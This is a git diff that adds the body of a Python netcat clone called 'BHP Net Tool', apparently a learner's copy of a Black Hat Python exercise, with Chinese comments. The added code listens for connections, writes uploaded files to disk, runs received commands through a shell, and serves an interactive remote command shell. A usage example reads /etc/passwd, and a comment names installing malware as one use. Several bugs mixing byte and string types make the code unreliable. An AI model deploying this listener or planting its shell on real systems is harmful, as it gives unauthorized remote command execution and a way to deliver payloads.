@@ -25,11 +25,19 @@ execute              = ''
 target               = ''
 upload_destination   = ''
 port                 = 0
-
 """
 这里导入了说有需要的py库并设置了些全局变量。
 接下来创建主函数处理命令行参数和调用编写的其他函数。
+
+usage()函数用于参数的说明帮助、当用户输入错误的参数时会输出相应的提示；
+client_sender()函数用于与目标主机建立连接并交互数据直到没有更多的数据发送回来，然后等待用户下一步的输入并继续发送和接收数据，直到用户结束脚本运行；
+server_loop()函数用于建立监听端口并实现多线程处理新的客户端；
+run_command()函数用于执行命令，其中subprocess库提供多种与客户端程序交互的方法；
+client_handler()函数用于实现文件上传、命令执行和与shell相关的功能，其中wb标识确保是以二进制的格式写入文件、从而确保上传和写入的二进制文件能够成功执行；
+主函数main()中是先读取所有的命令行选项从而设置相应的变量，然后从标准输入中读取数据并通过网络发送数据，若需要交互式地发送数据需要发送CTRL-D以避免从标准输入中读取数据，若检测到listen参数为True则调用server_loop()函数准备处理下一步命令。
+
 """
+
 def usage():
     print('BHP Net Tool\n')
     print('Usage: bhpnet.py -t target_host -p port')
@@ -37,14 +45,163 @@ def usage():
     print('-c --command             - execute the given file upon receiving a connection')
     print('-u --upload=destination  - initialize a command shell')
     print('-e --execute=file_to_run - upon receiving connection upload a file and write to [dextination]')
-    print('')
-    print('')
+    print('\n')
     print('Examples:')
     print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
     print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
     print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'')
     print('echo: "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135')
     sys.exit(0)
+
+def run_command(command):
+    # 删除字符串末尾的空格
+    command = command.rstrip()
+    # 运行命令并将输出放回
+    try:
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+    except:
+        output = "Failed to execute command.\r\n"
+    # 将输出发送
+    return output
+
+def clients_sender(buffer):
+    print('clients_sender')
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # 连接到目标主机
+        client.connect((target, port))
+
+        if len(buffer):
+            client.send(buffer.encode())
+
+        while True:
+            # 现在等待数据传回
+            recv_len = 1
+            response = 1
+
+            while recv_len:
+                data        = client.recv(4096)
+                recv_len    = len(data)
+                response    += data
+
+                if recv_len < 4096:
+                    break
+            
+            # 等待更多输入
+            buffer = input('')
+            buffer += '\n'
+
+            # 发送出去
+            client.send(buffer.encode())
+    except:
+        print('[*] Exception! Exiting.')
+        # 关闭链接
+        client.close()
+    
+    """
+        从建立一个tcp嵌套字对象开始，
+        首先检测是否已经从标准输入中接受到了数据。
+        如果一切正常，就将数据发送给远程目标主机并接受回传数据，直到没有更多的数据发送回来。
+        然后，等待用户下一步的输入并继续发送和接受数据，直到用户结束脚本运行。
+
+        附加的异常处理用来对用户的输入进行特殊处理，
+        这样我们的客户端就能与命令行shell兼容。
+
+        现在，我们继续创建服务器端的主循环和子函数，
+        用来对命令行shell的创建和命令的执行处理
+    """
+
+def server_loop():
+    print('server_loop')
+    global target
+
+    # 如果没有定义目标，那么我们监听所有接口
+    if not len(target):
+        target = '0.0.0.0'
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((target, port))
+    server.listen(5)
+
+    while True:
+        client_socket, addr = server.accept()
+
+        # 分析一个线程处理新的客户端
+        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
+        client_thread.start()
+
+def client_handler(client_socket):
+    print('client_handler')
+    global upload
+    global execute
+    global command
+
+    # 检测上传文件=============1
+    if len(upload_destination):
+        # 读取所有字符并写下目标
+        file_buffer = ''
+
+        # 持续读取数据直到没符合的数据============2
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            else:
+                file_buffer +=data
+        
+        # 现在我们接受这些数据并将他们写出来============3
+        try:
+            file_descriptor = open(upload_destination,'wb')
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
+            
+            text = 'Successfully saved file to %s\r\n' % upload_destination
+            # 确认文件已经写出来
+            client_socket.send(text.encode())
+        
+        except:
+            text = 'Failed to save file to %s\r\n' % upload_destination
+
+            client_socket.send(text.encode())
+    
+    
+    # 检查命令执行
+    if len(execute):
+        # 运行命令
+        output = run_command(execute)
+        client_socket.send(output.encode())
+
+    # 如果需要一个命令行shell，那么我们进入另一个循环============4
+    if command:
+        while True:
+            # 跳出一个窗口
+            client_socket.send(str.encode('<BHP:#>'))
+            # 现在我们接收文件直到发现换行符
+            cmd_buffer = ''
+            while '\n' not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024)
+            
+            # 返回命令行输出
+            response = run_command(cmd_buffer)
+
+            # 返回相应数据
+            client_socket.send(response)
+    """
+        第一段的代码负责检测我们网络工具在建立连接之后是否设置为接收文件，
+        这样有助于我们上传和执行测试脚本、安装恶意软件或者让恶意软件清除我们的py脚本
+
+        首先在循环中（2）接受文件数据，保证数据完全接受。
+        然后打开一个文件语柄并将内容写入文件中。
+        wb的标示确保我们是以二进制的格式写入文件，这样我们就能确保我们上传和写入的二进制文件能够成功执行。
+
+        之后我们添加文件的执行功能（3），通过调用我们之前写好的run_command函数执行文件并将结果通过网络回传。
+
+        最后一段代码处理我们的命令行shell（4）：程序持续处理输入的数据执行命令并将输出回传。
+
+        你会注意到函数在扫描每一行的换行字符以决定何时处理命令，这就会让它和netcat一样好用。
+        然而，如果你自己编写一个py客户端与它交互，那么要记得添加换行符。
+    """
 
 def main():
     global listen
@@ -109,9 +266,7 @@ def main():
 
         接下来的代码中，我们要模仿 netcat 从标准输入中读取数据，并通过网路发送数据。
     """
-    
-
-
+   
 main()
 
 
